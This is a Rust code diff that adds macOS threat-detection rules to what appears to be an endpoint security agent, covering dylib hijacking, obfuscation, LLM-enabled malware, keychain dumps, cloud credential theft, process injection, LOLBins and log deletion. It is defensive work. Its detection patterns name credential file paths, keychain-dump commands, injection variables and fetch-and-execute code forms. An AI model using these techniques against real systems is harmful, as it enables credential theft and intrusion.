@@ -3,7 +3,10 @@ use crate::classify::{
     is_persistence_tool_command, is_script_interpreter,
 };
 use crate::command_patterns;
+use crate::cryptomining;
+use crate::exfiltration;
 use crate::execution_graph::{ExecutionChain, ExecutionGraphSnapshot};
+use crate::lateral_movement;
 use crate::lineage::LineageSnapshot;
 use crate::models::{AlertSeverity, FileEventRecord, ProcessInfo, TelemetryEvent};
 use chrono::{DateTime, Duration, Utc};
@@ -71,6 +74,23 @@ pub fn evaluate_detections(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
     detections.extend(detect_security_tool_tampering(ctx));
     detections.extend(detect_account_manipulation(ctx));
     detections.extend(detect_plist_modification(ctx));
+    // Intelligence upgrades
+    detections.extend(detect_dylib_hijacking(ctx));
+    detections.extend(detect_obfuscated_content(ctx));
+    detections.extend(detect_llm_malware_patterns(ctx));
+    detections.extend(detect_keychain_dump(ctx));
+    detections.extend(detect_cloud_credential_access(ctx));
+    detections.extend(detect_clipboard_harvesting(ctx));
+    // Tranche 2 intelligence upgrades
+    detections.extend(detect_process_injection(ctx));
+    detections.extend(detect_expanded_lolbins(ctx));
+    detections.extend(detect_defense_evasion_active(ctx));
+    detections.extend(detect_malicious_document(ctx));
+    // Tranche 3 intelligence upgrades
+    detections.extend(detect_lateral_movement_ext(ctx));
+    detections.extend(detect_exfiltration_ext(ctx));
+    detections.extend(detect_recon_correlation(ctx));
+    detections.extend(detect_cryptomining_ext(ctx));
     detections
 }
 
@@ -3379,6 +3399,1486 @@ fn detect_exfiltration_pattern(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
     alerts
 }
 
+// ─── Dylib hijacking detection (T1574.006) ────────────────────────────────────
+//
+// Detect when a new dynamic library (.dylib) appears in user-writable locations
+// that take precedence over legitimate library search paths. Attackers use dylib
+// hijacking to achieve code execution whenever a legitimate application loads
+// the hijacked library.
+//
+// We watch for .dylib files appearing in:
+//   ~/Library/ subtree (user-level library directories)
+//   /usr/local/lib/ (common for Homebrew-managed libraries)
+
+fn detect_dylib_hijacking(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
+    let mut alerts = Vec::new();
+    let cutoff = ctx.now - Duration::seconds(60);
+
+    for event in &ctx.recent_file_events {
+        if event.timestamp < cutoff {
+            continue;
+        }
+        if event.kind != "file_created" {
+            continue; // only alert on new dylibs, not modifications to existing ones
+        }
+        if !event.path.to_ascii_lowercase().ends_with(".dylib") {
+            continue;
+        }
+
+        let path_lower = event.path.to_ascii_lowercase();
+        let in_user_library = path_lower.contains("/library/");
+        let in_usr_local_lib = path_lower.contains("/usr/local/lib/");
+
+        if !in_user_library && !in_usr_local_lib {
+            continue;
+        }
+
+        // Suppress dylibs inside application bundles — these are legitimate
+        if path_lower.contains(".app/contents/") || path_lower.contains(".framework/") {
+            continue;
+        }
+
+        alerts.push(build_alert(
+            ctx.now,
+            "alert_dylib_hijacking_attempt",
+            AlertSeverity::High,
+            "persistence",
+            "New dynamic library placed in user-writable library path — possible dylib hijacking",
+            json!({
+                "path": event.path,
+                "mitre_technique": "T1574.006",
+                "confidence": "medium",
+                "reason": "A .dylib file was created in a location that takes precedence over system library paths",
+                "in_user_library": in_user_library,
+                "in_usr_local_lib": in_usr_local_lib,
+            }),
+        ));
+    }
+
+    alerts
+}
+
+// ─── Obfuscated content detection (T1027) ────────────────────────────────────
+//
+// Detect scripts and files that contain encoded or obfuscated payloads.
+// Reads the first 4 KB of newly created script files and computes Shannon
+// entropy + pattern analysis. High entropy or known obfuscation patterns
+// (base64 blobs, hex shellcode, eval/exec combos) score as suspicious.
+
+fn detect_obfuscated_content(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
+    use crate::entropy;
+    use std::io::Read;
+
+    let mut alerts = Vec::new();
+    // Only analyse files created or modified within the last 10 seconds
+    let cutoff = ctx.now - Duration::seconds(10);
+
+    for event in &ctx.recent_file_events {
+        if event.timestamp < cutoff {
+            continue;
+        }
+        if !matches!(event.kind.as_str(), "file_created" | "file_modified") {
+            continue;
+        }
+
+        let ext = file_extension(&event.path);
+        let has_script_ext = entropy::is_script_extension(&ext);
+        let no_extension = ext.is_empty();
+
+        // Only analyse script files and extension-less files
+        if !has_script_ext && !no_extension {
+            continue;
+        }
+
+        // Skip very small files — payloads need some minimum size
+        if event.size_bytes < 64 {
+            continue;
+        }
+
+        // Read first 4 KB
+        let mut buf = [0u8; 4096];
+        let bytes_read = match std::fs::File::open(&event.path)
+            .and_then(|mut f| f.read(&mut buf))
+        {
+            Ok(n) => n,
+            Err(_) => continue,
+        };
+
+        if bytes_read < 32 {
+            continue;
+        }
+
+        let result = entropy::analyze_obfuscation(&buf[..bytes_read]);
+
+        if result.suspicion_score < 20 {
+            continue;
+        }
+
+        alerts.push(build_alert(
+            ctx.now,
+            "alert_obfuscated_content_detected",
+            AlertSeverity::High,
+            "defense_evasion",
+            "File contains obfuscated or encoded content consistent with payload delivery",
+            json!({
+                "path": event.path,
+                "entropy": result.entropy,
+                "has_base64_blob": result.has_base64_blob,
+                "has_hex_shellcode": result.has_hex_shellcode,
+                "has_eval_dynamic": result.has_eval_dynamic,
+                "suspicion_score": result.suspicion_score,
+                "file_extension": ext,
+                "mitre_technique": "T1027",
+                "confidence": if result.suspicion_score >= 40 { "high" } else { "medium" },
+            }),
+        ));
+    }
+
+    alerts
+}
+
+// ─── LLM-enabled malware detection (T1059) ───────────────────────────────────
+//
+// Detects signs of LLM-enabled malware — a new attack class (documented by
+// SentinelOne in 2025) where malware embeds an LLM API key and generates
+// malicious code at runtime via an AI API. The generated payload is different
+// every time, defeating signature detection. But the delivery mechanism
+// (API key presence, dynamic code fetch+execute) is detectable.
+
+fn detect_llm_malware_patterns(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
+    use std::io::Read;
+
+    let mut alerts = Vec::new();
+    let cutoff = ctx.now - Duration::seconds(30);
+
+    // ── Pattern 1: Embedded LLM API keys in newly created script files ────────
+    for event in &ctx.recent_file_events {
+        if event.timestamp < cutoff {
+            continue;
+        }
+        if !matches!(event.kind.as_str(), "file_created" | "file_modified") {
+            continue;
+        }
+
+        let ext = file_extension(&event.path);
+        use crate::entropy::is_script_extension;
+        if !is_script_extension(&ext) && !ext.is_empty() {
+            continue;
+        }
+
+        let mut buf = [0u8; 8192];
+        let bytes_read = match std::fs::File::open(&event.path)
+            .and_then(|mut f| f.read(&mut buf))
+        {
+            Ok(n) => n,
+            Err(_) => continue,
+        };
+
+        if bytes_read < 8 {
+            continue;
+        }
+
+        let text = String::from_utf8_lossy(&buf[..bytes_read]);
+
+        if let Some(pattern) = detect_api_key_in_text(&text) {
+            alerts.push(build_alert(
+                ctx.now,
+                "alert_llm_api_key_detected",
+                AlertSeverity::High,
+                "execution",
+                "File contains an embedded LLM API key — possible LLM-enabled malware",
+                json!({
+                    "path": event.path,
+                    "pattern_matched": pattern,
+                    "mitre_technique": "T1059",
+                    "confidence": "high",
+                    "description": "Embedded LLM API keys in scripts indicate automated code-generation malware",
+                }),
+            ));
+        }
+
+        if detect_runtime_code_generation(&text) {
+            alerts.push(build_alert(
+                ctx.now,
+                "alert_runtime_code_generation",
+                AlertSeverity::Critical,
+                "execution",
+                "Script fetches and executes dynamically generated code — hallmark of LLM-enabled malware",
+                json!({
+                    "path": event.path,
+                    "mitre_technique": "T1059",
+                    "confidence": "high",
+                    "description": "Pattern: exec(requests...) or eval(urllib...) — process is executing fetched remote code",
+                }),
+            ));
+        }
+    }
+
+    // ── Pattern 2: Process arguments referencing LLM API endpoints ────────────
+    let llm_endpoints = [
+        "api.openai.com",
+        "api.anthropic.com",
+        "api.mistral.ai",
+        "generativelanguage.googleapis.com",
+        "api.cohere.ai",
+        "api.together.xyz",
+    ];
+
+    for process in &ctx.recent_processes {
+        let full = format!("{} {}", process.command, process.args).to_ascii_lowercase();
+
+        let is_interpreter = matches!(
+            process.process_kind.as_str(),
+            "interpreter"
+        ) || {
+            let cmd = Path::new(&process.command)
+                .file_name()
+                .and_then(|n| n.to_str())
+                .unwrap_or("")
+                .to_ascii_lowercase();
+            matches!(cmd.as_str(), "python" | "python3" | "node" | "ruby" | "perl")
+        };
+
+        if !is_interpreter {
+            continue;
+        }
+
+        if llm_endpoints.iter().any(|ep| full.contains(ep)) {
+            // Check for exec/eval in args — combined with LLM endpoint = very suspicious
+            if full.contains("exec(") || full.contains("eval(") || full.contains("compile(") {
+                let mut details = json!({
+                    "pid": process.pid,
+                    "ppid": process.ppid,
+                    "command": process.command,
+                    "args": process.args,
+                    "process_kind": process.process_kind,
+                    "mitre_technique": "T1059",
+                    "confidence": "high",
+                    "description": "Interpreter process contacting LLM API while using exec/eval — LLM-enabled malware pattern",
+                });
+                merge_chain_details(&mut details, chain_details(process.pid, ctx));
+
+                alerts.push(build_alert(
+                    ctx.now,
+                    "alert_runtime_code_generation",
+                    AlertSeverity::Critical,
+                    "execution",
+                    "Process contacting LLM API with exec/eval — LLM-enabled malware pattern",
+                    details,
+                ));
+            }
+        }
+    }
+
+    alerts
+}
+
+/// Check text for known LLM API key patterns.
+/// Returns the pattern name if found, None otherwise.
+fn detect_api_key_in_text(text: &str) -> Option<&'static str> {
+    // OpenAI: sk- followed by 48+ alphanumeric characters
+    if has_api_key_pattern(text, "sk-", 48) {
+        return Some("openai_key");
+    }
+    // Anthropic: sk-ant- followed by 90+ alphanumeric/hyphen characters
+    if has_api_key_pattern(text, "sk-ant-", 90) {
+        return Some("anthropic_key");
+    }
+    // Google AI: AIza followed by 35 alphanumeric characters
+    if has_api_key_pattern(text, "AIza", 35) {
+        return Some("google_ai_key");
+    }
+    // HuggingFace: hf_ followed by 36 alphanumeric characters
+    if has_api_key_pattern(text, "hf_", 36) {
+        return Some("huggingface_key");
+    }
+    None
+}
+
+/// Check if `text` contains `prefix` followed by at least `min_key_chars` of
+/// alphanumeric or `-_` characters — a common API key structure.
+fn has_api_key_pattern(text: &str, prefix: &str, min_key_chars: usize) -> bool {
+    let mut search = text;
+    while let Some(idx) = search.find(prefix) {
+        let after_prefix = &search[idx + prefix.len()..];
+        let key_len = after_prefix
+            .chars()
+            .take_while(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_')
+            .count();
+        if key_len >= min_key_chars {
+            return true;
+        }
+        // Advance past this match to look for more
+        let advance = (idx + 1).min(search.len());
+        search = &search[advance..];
+    }
+    false
+}
+
+/// Check for patterns where a process fetches remote content and immediately executes it.
+fn detect_runtime_code_generation(text: &str) -> bool {
+    // exec(requests.get(...).text) — fetch from HTTP then exec
+    if text.contains("exec(") && text.contains("requests.") {
+        return true;
+    }
+    // eval(urllib... — eval of fetched content
+    if (text.contains("eval(") || text.contains("eval ("))
+        && text.contains("urllib")
+    {
+        return true;
+    }
+    // exec(response. — execute response body
+    if text.contains("exec(response.") || text.contains("exec(r.") {
+        return true;
+    }
+    // compile( combined with fetch — dynamic compilation of remote code
+    if text.contains("compile(") && (text.contains("fetch(") || text.contains("requests.")) {
+        return true;
+    }
+    false
+}
+
+// ─── Keychain bulk-dump detection (T1555.001) ─────────────────────────────────
+//
+// Separate from the individual keychain query detection in detect_keychain_access_attempt.
+// This specifically targets the `security dump-keychain` pattern which extracts ALL
+// keychain items at once — the canonical mass-credential-theft technique.
+// Also detects `security list-keychains` combined with subsequent queries.
+
+fn detect_keychain_dump(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
+    let mut alerts = Vec::new();
+
+    // Count how many keychain dump/list operations we see in recent processes
+    let mut dump_procs: Vec<&crate::models::ProcessInfo> = Vec::new();
+
+    for process in &ctx.recent_processes {
+        let cmd_basename = Path::new(&process.command)
+            .file_name()
+            .and_then(|n| n.to_str())
+            .unwrap_or("")
+            .to_ascii_lowercase();
+
+        if cmd_basename != "security" {
+            continue;
+        }
+
+        if process.process_kind == "system" {
+            continue;
+        }
+
+        let args_lower = process.args.to_ascii_lowercase();
+
+        let is_mass_dump = args_lower.starts_with("dump-keychain")
+            || args_lower.contains(" dump-keychain")
+            || args_lower.starts_with("list-keychains")
+            || args_lower.contains(" list-keychains")
+            || (args_lower.contains("find-generic-password")
+                && args_lower.contains("-a")
+                && args_lower.contains("-w"));
+
+        if is_mass_dump {
+            dump_procs.push(process);
+        }
+    }
+
+    for process in dump_procs {
+        let args_lower = process.args.to_ascii_lowercase();
+        let is_full_dump = args_lower.contains("dump-keychain");
+
+        let severity = if is_full_dump {
+            AlertSeverity::Critical
+        } else {
+            AlertSeverity::High
+        };
+
+        let mut details = json!({
+            "pid": process.pid,
+            "ppid": process.ppid,
+            "command": process.command,
+            "args": process.args,
+            "process_kind": process.process_kind,
+            "mitre_technique": "T1555.001",
+            "confidence": "high",
+            "description": if is_full_dump {
+                "security dump-keychain extracts all stored passwords and certificates at once"
+            } else {
+                "security list-keychains or bulk credential query observed"
+            },
+        });
+        merge_chain_details(&mut details, chain_details(process.pid, ctx));
+
+        alerts.push(build_alert(
+            ctx.now,
+            "alert_keychain_dump_attempt",
+            severity,
+            "credential_access",
+            "Mass Keychain dump attempt — all stored credentials may be extracted",
+            details,
+        ));
+    }
+
+    alerts
+}
+
+// ─── Cloud credential access detection (T1552.001) ───────────────────────────
+//
+// Extends the existing SSH/AWS credential detection to cover additional cloud
+// and developer credential files. These files store tokens and secrets that
+// provide access to cloud infrastructure and developer services.
+
+fn detect_cloud_credential_access(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
+    let home = std::env::var("HOME").unwrap_or_default();
+
+    struct CloudCredTarget {
+        path_fragment: &'static str,
+        label: &'static str,
+        mitre: &'static str,
+    }
+
+    let targets: &[CloudCredTarget] = &[
+        CloudCredTarget {
+            path_fragment: ".azure/",
+            label: "Azure credentials directory",
+            mitre: "T1552.001",
+        },
+        CloudCredTarget {
+            path_fragment: ".config/gcloud/",
+            label: "Google Cloud credentials directory",
+            mitre: "T1552.001",
+        },
+        CloudCredTarget {
+            path_fragment: ".kube/config",
+            label: "Kubernetes kubeconfig (cluster credentials)",
+            mitre: "T1552.001",
+        },
+        CloudCredTarget {
+            path_fragment: ".docker/config.json",
+            label: "Docker Hub credentials",
+            mitre: "T1552.001",
+        },
+        CloudCredTarget {
+            path_fragment: ".npmrc",
+            label: "npm registry token file",
+            mitre: "T1552.001",
+        },
+        CloudCredTarget {
+            path_fragment: ".pypirc",
+            label: "PyPI credentials file",
+            mitre: "T1552.001",
+        },
+        CloudCredTarget {
+            path_fragment: ".netrc",
+            label: "Generic credentials file (.netrc)",
+            mitre: "T1552.001",
+        },
+    ];
+
+    let mut alerts = Vec::new();
+
+    for process in &ctx.recent_processes {
+        if process.process_kind == "system" {
+            continue;
+        }
+
+        let cmd_basename = Path::new(&process.command)
+            .file_name()
+            .and_then(|n| n.to_str())
+            .unwrap_or("")
+            .to_ascii_lowercase();
+
+        // CLI tools that legitimately access their own credential files
+        if matches!(
+            cmd_basename.as_str(),
+            "az" | "gcloud" | "kubectl" | "docker" | "npm" | "pip" | "pip3" | "twine" | "curl" | "wget"
+        ) {
+            continue;
+        }
+
+        let full_lower = format!("{} {}", process.command, process.args).to_ascii_lowercase();
+
+        for target in targets {
+            let absolute = format!("{home}/{}", target.path_fragment).to_ascii_lowercase();
+            let relative = target.path_fragment.to_ascii_lowercase();
+
+            if !full_lower.contains(&absolute) && !full_lower.contains(&relative) {
+                continue;
+            }
+
+            let mut details = json!({
+                "pid": process.pid,
+                "ppid": process.ppid,
+                "command": process.command,
+                "args": process.args,
+                "process_kind": process.process_kind,
+                "accessed_path": target.path_fragment,
+                "label": target.label,
+                "mitre_technique": target.mitre,
+                "confidence": "high",
+            });
+            merge_chain_details(&mut details, chain_details(process.pid, ctx));
+
+            alerts.push(build_alert(
+                ctx.now,
+                "alert_cloud_credential_access",
+                AlertSeverity::High,
+                "credential_access",
+                &format!(
+                    "Unexpected process accessed {}: {}",
+                    target.label, process.command
+                ),
+                details,
+            ));
+            break; // one alert per process
+        }
+    }
+
+    alerts
+}
+
+// ─── Clipboard harvesting detection (T1115) ───────────────────────────────────
+//
+// Some infostealer malware monitors the clipboard for passwords, crypto wallet
+// addresses, and 2FA codes. On macOS, `pbpaste` is the standard way to read
+// the clipboard. Multiple invocations in a short window by a non-user process
+// is suspicious.
+
+fn detect_clipboard_harvesting(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
+    let mut alerts = Vec::new();
+
+    // Count recent pbpaste invocations, grouped by parent process
+    let mut pbpaste_by_parent: std::collections::HashMap<i32, Vec<&crate::models::ProcessInfo>> =
+        std::collections::HashMap::new();
+
+    for process in &ctx.recent_processes {
+        let cmd_basename = Path::new(&process.command)
+            .file_name()
+            .and_then(|n| n.to_str())
+            .unwrap_or("")
+            .to_ascii_lowercase();
+
+        if cmd_basename == "pbpaste" {
+            pbpaste_by_parent
+                .entry(process.ppid)
+                .or_default()
+                .push(process);
+        }
+    }
+
+    // A single parent spawning pbpaste 3+ times in one detection window is suspicious
+    for (ppid, invocations) in pbpaste_by_parent {
+        if invocations.len() < 3 {
+            continue;
+        }
+
+        let sample = invocations[0];
+
+        let mut details = json!({
+            "ppid": ppid,
+            "invocation_count": invocations.len(),
+            "parent_command": sample.parent_command,
+            "parent_process_kind": sample.parent_process_kind,
+            "mitre_technique": "T1115",
+            "confidence": "medium",
+            "description": format!(
+                "pbpaste invoked {} times by the same parent process — possible clipboard harvesting",
+                invocations.len()
+            ),
+        });
+        merge_chain_details(&mut details, chain_details(ppid, ctx));
+
+        alerts.push(build_alert(
+            ctx.now,
+            "alert_clipboard_monitoring",
+            AlertSeverity::Medium,
+            "collection",
+            "Repeated clipboard reads — possible clipboard harvesting for passwords or crypto addresses",
+            details,
+        ));
+    }
+
+    alerts
+}
+
+// ─── Tranche 2 — Process Injection Detection (T1055) ──────────────────────────
+
+fn detect_process_injection(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
+    let mut alerts = Vec::new();
+
+    for process in &ctx.recent_processes {
+        if process.process_kind == "system" || process.process_kind == "browser" {
+            continue;
+        }
+
+        let cmd_basename = Path::new(&process.command)
+            .file_name()
+            .and_then(|n| n.to_str())
+            .unwrap_or("")
+            .to_ascii_lowercase();
+        let args_lower = process.args.to_ascii_lowercase();
+        let parent_kind = process.parent_process_kind.as_deref().unwrap_or("");
+        let parent_cmd_lower = process.parent_command.as_deref().unwrap_or("").to_ascii_lowercase();
+        let cmd_lower = process.command.to_ascii_lowercase();
+
+        // 1. DYLD_INSERT_LIBRARIES — dylib injection into target process (T1055.001)
+        //    Highest confidence: this env var is the canonical macOS injection mechanism.
+        if args_lower.contains("dyld_insert_libraries") {
+            let mut details = json!({
+                "pid": process.pid,
+                "ppid": process.ppid,
+                "command": process.command,
+                "args": process.args,
+                "process_kind": process.process_kind,
+                "parent_command": process.parent_command,
+                "parent_process_kind": process.parent_process_kind,
+                "trigger": "dyld_insert_libraries",
+                "mitre_technique": "T1055.001",
+                "confidence": "high",
+            });
+            merge_chain_details(&mut details, chain_details(process.pid, ctx));
+            alerts.push(build_alert(
+                ctx.now,
+                "alert_dyld_injection_attempt",
+                AlertSeverity::Critical,
+                "process_injection",
+                "Process launched with DYLD_INSERT_LIBRARIES — dylib injection into target process",
+                details,
+            ));
+            continue;
+        }
+
+        // 2. Process hollowing indicator — known system binary running from unexpected path (T1055.012)
+        //    e.g. /tmp/bash or /var/folders/.../curl
+        let hollow_candidates = [
+            "bash", "sh", "zsh", "curl", "wget", "python3", "python",
+            "ruby", "perl", "nc", "ncat", "ssh", "scp", "sftp",
+        ];
+        let is_known_binary_name = hollow_candidates.iter().any(|b| cmd_basename == *b);
+        let from_system_path = cmd_lower.starts_with("/usr/bin/")
+            || cmd_lower.starts_with("/bin/")
+            || cmd_lower.starts_with("/usr/sbin/")
+            || cmd_lower.starts_with("/usr/libexec/")
+            || cmd_lower.starts_with("/sbin/");
+        let from_tmp_or_user_writable = cmd_lower.contains("/tmp/")
+            || cmd_lower.contains("/var/folders/")
+            || cmd_lower.contains("/downloads/")
+            || cmd_lower.contains("/.cache/")
+            || cmd_lower.contains("/private/tmp/");
+
+        if is_known_binary_name && !from_system_path && from_tmp_or_user_writable {
+            let mut details = json!({
+                "pid": process.pid,
+                "ppid": process.ppid,
+                "command": process.command,
+                "args": process.args,
+                "process_kind": process.process_kind,
+                "parent_command": process.parent_command,
+                "parent_process_kind": process.parent_process_kind,
+                "trigger": "known_binary_unexpected_path",
+                "mitre_technique": "T1055.012",
+                "confidence": "high",
+            });
+            merge_chain_details(&mut details, chain_details(process.pid, ctx));
+            alerts.push(build_alert(
+                ctx.now,
+                "alert_process_hollowing_indicator",
+                AlertSeverity::Critical,
+                "process_injection",
+                "Known system binary name running from /tmp or /var/folders — possible process hollowing",
+                details,
+            ));
+            continue;
+        }
+
+        // 3. Debugger/introspection tool from interpreter chain — task_for_pid abuse (T1055.008)
+        //    lldb/gdb/dtrace are the macOS mechanisms for inter-process memory access.
+        let debugger_tools = ["lldb", "gdb", "dtrace", "vmmap", "dtruss", "instruments"];
+        let is_debugger = debugger_tools.iter().any(|d| cmd_basename == *d);
+
+        if is_debugger {
+            let from_interpreter_or_downloads = parent_kind == "interpreter"
+                || parent_kind == "unknown"
+                || process.behavior.references_downloads_path
+                || process.command_path_kind == "downloads";
+
+            // Suppress: developer tooling invoked interactively from Terminal/iTerm with no
+            // Downloads context — this is normal developer activity.
+            let is_interactive_dev = (parent_cmd_lower.contains("terminal")
+                || parent_cmd_lower.contains("iterm"))
+                && process.command_path_kind != "downloads"
+                && !process.behavior.references_downloads_path;
+
+            if from_interpreter_or_downloads && !is_interactive_dev {
+                let mut details = json!({
+                    "pid": process.pid,
+                    "ppid": process.ppid,
+                    "command": process.command,
+                    "args": process.args,
+                    "process_kind": process.process_kind,
+                    "parent_command": process.parent_command,
+                    "parent_process_kind": process.parent_process_kind,
+                    "trigger": "debugger_from_interpreter",
+                    "mitre_technique": "T1055.008",
+                    "confidence": "medium",
+                });
+                merge_chain_details(&mut details, chain_details(process.pid, ctx));
+                alerts.push(build_alert(
+                    ctx.now,
+                    "alert_debugger_injection_attempt",
+                    AlertSeverity::High,
+                    "process_injection",
+                    "Debugger/introspection tool launched from interpreter chain — possible task_for_pid abuse",
+                    details,
+                ));
+                continue;
+            }
+        }
+
+        // 4. Binary executed from /tmp or /var/folders by interpreter — injection staging (T1055)
+        let from_tmp = process.command.starts_with("/tmp/")
+            || process.command.starts_with("/private/tmp/")
+            || process.command.contains("/var/folders/");
+
+        if from_tmp && (parent_kind == "interpreter" || parent_kind == "unknown") {
+            // Skip if already covered by hollow check above
+            if !is_known_binary_name {
+                let mut details = json!({
+                    "pid": process.pid,
+                    "ppid": process.ppid,
+                    "command": process.command,
+                    "args": process.args,
+                    "process_kind": process.process_kind,
+                    "parent_command": process.parent_command,
+                    "parent_process_kind": process.parent_process_kind,
+                    "trigger": "tmp_binary_from_interpreter",
+                    "mitre_technique": "T1055",
+                    "confidence": "medium",
+                });
+                merge_chain_details(&mut details, chain_details(process.pid, ctx));
+                alerts.push(build_alert(
+                    ctx.now,
+                    "alert_process_injection_precursor",
+                    AlertSeverity::High,
+                    "process_injection",
+                    "Binary executed from /tmp or /var/folders by interpreter — injection staging indicator",
+                    details,
+                ));
+            }
+        }
+    }
+
+    alerts
+}
+
+// ─── Tranche 2 — Expanded LOLBin Detection ────────────────────────────────────
+
+fn detect_expanded_lolbins(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
+    let mut alerts = Vec::new();
+
+    'process: for process in &ctx.recent_processes {
+        if process.process_kind == "system" || process.process_kind == "browser" {
+            continue;
+        }
+
+        let cmd_basename = Path::new(&process.command)
+            .file_name()
+            .and_then(|n| n.to_str())
+            .unwrap_or("")
+            .to_ascii_lowercase();
+        let args_lower = process.args.to_ascii_lowercase();
+        let parent_kind = process.parent_process_kind.as_deref().unwrap_or("");
+        let parent_cmd_lower = process.parent_command.as_deref().unwrap_or("").to_ascii_lowercase();
+        let is_interpreter_parent = parent_kind == "interpreter"
+            || parent_cmd_lower.contains("bash")
+            || parent_cmd_lower.contains("zsh")
+            || parent_cmd_lower.contains("python");
+        let from_downloads = process.behavior.references_downloads_path
+            || process.command_path_kind == "downloads";
+
+        // Suppress whitelisted interactive shells spawned from Terminal/IDE
+        let is_interactive_terminal = (parent_cmd_lower.contains("terminal")
+            || parent_cmd_lower.contains("iterm")
+            || parent_cmd_lower.contains("cursor")
+            || parent_cmd_lower.contains("vscode"))
+            && !from_downloads;
+
+        let (trigger, mitre, reason) = 'detection: {
+
+            // osascript executing a shell command via "do shell script"
+            if cmd_basename == "osascript"
+                && (args_lower.contains("do shell script")
+                    || (args_lower.contains("-e")
+                        && (args_lower.contains("shell") || args_lower.contains("bash") || args_lower.contains("zsh"))))
+                && !is_interactive_terminal
+            {
+                break 'detection ("osascript_shell", "T1059.002",
+                    "osascript executing shell command via do shell script — AppleScript LOLBin");
+            }
+
+            // Python/Perl/Ruby one-liner spawned from interpreter parent
+            if (cmd_basename == "python3" || cmd_basename == "python"
+                || cmd_basename == "perl" || cmd_basename == "ruby")
+                && (args_lower.contains(" -c ") || args_lower.starts_with("-c "))
+                && is_interpreter_parent
+            {
+                break 'detection ("interpreter_oneliner", "T1059.006",
+                    "Python/Perl/Ruby one-liner spawned from interpreter chain");
+            }
+
+            // launchctl bootstrap/load from /tmp or Downloads path
+            if cmd_basename == "launchctl"
+                && (args_lower.contains("bootstrap") || args_lower.contains("load"))
+                && (args_lower.contains("/tmp/") || args_lower.contains("/downloads/")
+                    || args_lower.contains("/var/folders/"))
+            {
+                break 'detection ("launchctl_from_suspicious_path", "T1569.002",
+                    "launchctl bootstrapping service from /tmp or Downloads path");
+            }
+
+            // xargs piping output into a shell
+            if cmd_basename == "xargs"
+                && (args_lower.contains(" sh ") || args_lower.contains(" bash ")
+                    || args_lower.contains(" zsh ") || args_lower.contains("-i sh")
+                    || args_lower.contains("-i bash"))
+            {
+                break 'detection ("xargs_shell", "T1059.004",
+                    "xargs executing shell commands — command injection via xargs");
+            }
+
+            // nohup launching persistent background process from interpreter
+            if cmd_basename == "nohup" && is_interpreter_parent {
+                break 'detection ("nohup_from_interpreter", "T1059",
+                    "nohup used by interpreter chain to launch persistent background process");
+            }
+
+            // awk system() call from interpreter or Downloads context
+            if cmd_basename == "awk"
+                && (args_lower.contains("system(") || args_lower.contains("system ("))
+                && (is_interpreter_parent || from_downloads)
+            {
+                break 'detection ("awk_system_call", "T1059",
+                    "awk system() call from interpreter chain — command execution via awk");
+            }
+
+            // networksetup modifying DNS servers (possible C2 redirection)
+            if cmd_basename == "networksetup"
+                && args_lower.contains("-setdnsservers")
+                && !is_interactive_terminal
+            {
+                break 'detection ("networksetup_setdns", "T1565.001",
+                    "networksetup modifying DNS servers — possible C2 redirection via LOLBin");
+            }
+
+            // defaults write to Accessibility/TCC settings from interpreter chain
+            if cmd_basename == "defaults"
+                && args_lower.contains("write")
+                && (args_lower.contains("apple.accessibility")
+                    || args_lower.contains("apple.universalaccess")
+                    || args_lower.contains("nsservices"))
+                && (is_interpreter_parent || from_downloads)
+            {
+                break 'detection ("defaults_write_accessibility", "T1548.002",
+                    "defaults write modifying Accessibility/TCC settings from interpreter chain");
+            }
+
+            // screencapture invoked non-interactively by interpreter chain
+            if cmd_basename == "screencapture"
+                && (args_lower.contains("-x") || args_lower.contains("-t "))
+                && (is_interpreter_parent || from_downloads)
+            {
+                break 'detection ("screencapture_noninteractive", "T1113",
+                    "screencapture invoked non-interactively by interpreter — silent screenshot collection");
+            }
+
+            // tccutil reset clearing TCC permissions
+            if cmd_basename == "tccutil"
+                && args_lower.contains("reset")
+                && (is_interpreter_parent || from_downloads)
+            {
+                break 'detection ("tccutil_reset", "T1548.002",
+                    "tccutil reset clearing TCC privacy permissions — possible privilege bypass");
+            }
+
+            // installer executing package from /tmp via interpreter chain
+            if cmd_basename == "installer"
+                && args_lower.contains("-pkg")
+                && (args_lower.contains("/tmp/") || args_lower.contains("/var/folders/"))
+                && is_interpreter_parent
+            {
+                break 'detection ("installer_tmp_pkg", "T1218.004",
+                    "Apple installer executing package from /tmp via interpreter chain");
+            }
+
+            continue 'process;
+        };
+
+        let mut details = json!({
+            "pid": process.pid,
+            "ppid": process.ppid,
+            "command": process.command,
+            "args": process.args,
+            "process_kind": process.process_kind,
+            "parent_command": process.parent_command,
+            "parent_process_kind": process.parent_process_kind,
+            "trigger": trigger,
+            "mitre_technique": mitre,
+            "confidence": "medium",
+        });
+        merge_chain_details(&mut details, chain_details(process.pid, ctx));
+
+        alerts.push(build_alert(
+            ctx.now,
+            "alert_expanded_lolbin",
+            AlertSeverity::High,
+            "execution",
+            reason,
+            details,
+        ));
+    }
+
+    alerts
+}
+
+// ─── Tranche 2 — Defense Evasion Active Detection ─────────────────────────────
+
+fn detect_defense_evasion_active(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
+    let mut alerts = Vec::new();
+
+    'process: for process in &ctx.recent_processes {
+        if process.process_kind == "browser" {
+            continue;
+        }
+
+        let cmd_basename = Path::new(&process.command)
+            .file_name()
+            .and_then(|n| n.to_str())
+            .unwrap_or("")
+            .to_ascii_lowercase();
+        let args_lower = process.args.to_ascii_lowercase();
+        let parent_kind = process.parent_process_kind.as_deref().unwrap_or("");
+        let is_interpreter_parent = parent_kind == "interpreter";
+        let from_downloads = process.behavior.references_downloads_path
+            || process.command_path_kind == "downloads";
+
+        let (trigger, mitre, severity, reason) = 'detection: {
+
+            // Log deletion — rm targeting log directories
+            if cmd_basename == "rm"
+                && (args_lower.contains("/library/logs/")
+                    || args_lower.contains("/var/log/")
+                    || args_lower.contains("/private/var/log/"))
+                && (is_interpreter_parent || from_downloads)
+            {
+                break 'detection (
+                    "log_deletion_attempt", "T1070.002", AlertSeverity::High,
